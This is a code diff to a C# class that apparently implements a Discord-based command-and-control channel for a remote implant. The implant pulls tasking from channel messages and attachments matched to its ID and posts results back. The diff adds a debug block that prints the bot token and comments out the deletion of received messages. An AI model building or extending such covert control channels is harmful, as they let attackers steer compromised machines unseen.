@@ -3,6 +3,7 @@ using Agent.Models;
 using Discord;
 using Discord.WebSocket;
 using Newtonsoft.Json;
+using System.Net.Http;
 
 namespace Agent.Profiles
 {
@@ -35,12 +36,21 @@ namespace Agent.Profiles
             crypt = crypto;
             agentConfig = config;
             this.messageManager = messageManager;
+
+#if LOCALDEBUG
+            _token = Environment.GetEnvironmentVariable("discord_token");
+            Console.WriteLine(_token);
+            _channel_id = ulong.Parse("1161813089545638040");
+#else
             _token = "discord_token";
             _channel_id = ulong.Parse("bot_channel");
+#endif
+
             var gateway_config = new DiscordSocketConfig()
             {
                 GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
             };
+            _httpClient = new HttpClient();
             _client = new DiscordSocketClient(gateway_config);
             _client.MessageReceived += _client_MessageReceived;
             _client.Ready += _client_Ready;
@@ -55,7 +65,7 @@ namespace Agent.Profiles
         {
             Console.WriteLine("Message Received: " + message.Content);
             MessageWrapper discordMessage;
-            if (message.Attachments.Count > 0 && message.Attachments.FirstOrDefault().Filename.EndsWith("txt"))
+            if (message.Attachments.Count > 0 && message.Attachments.FirstOrDefault().Filename.Contains(_uuid))
             {
                 discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(await GetFileContentsAsync(message.Attachments.FirstOrDefault().Url));
             }
@@ -67,7 +77,7 @@ namespace Agent.Profiles
             if (discordMessage is not null &! discordMessage.to_server && discordMessage.client_id == _uuid) //It belongs to us
             {
                 Console.WriteLine("Got Message: " + discordMessage.message);
-                _ = message.DeleteAsync();
+                //_ = message.DeleteAsync();
 
                 if (!checkedin)
                 {
@@ -142,6 +152,7 @@ namespace Agent.Profiles
         {
             if(_client.LoginState != LoginState.LoggedIn)
             {
+                Console.WriteLine(_client.LoginState);
                 await this.Start();
             }
 
@@ -161,16 +172,17 @@ namespace Agent.Profiles
 
             ITextChannel channel = (ITextChannel)_client.GetChannel(_channel_id);
 
-            var chan = _client.GetChannel(1161813089545638040) as ITextChannel;
-
-            if (chan is null)
+            if (channel is null)
             {
-                Console.WriteLine("NO channel.");
+                Console.WriteLine("No channel.");
             }
 
             if (json.Length > 1950)
             {
-                await channel.SendFileAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage), discordMessage.sender_id + ".server");
+                using (MemoryStream stream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
+                {
+                    await channel.SendFileAsync(stream, discordMessage.sender_id + ".server");
+                }
             }
             else
             {
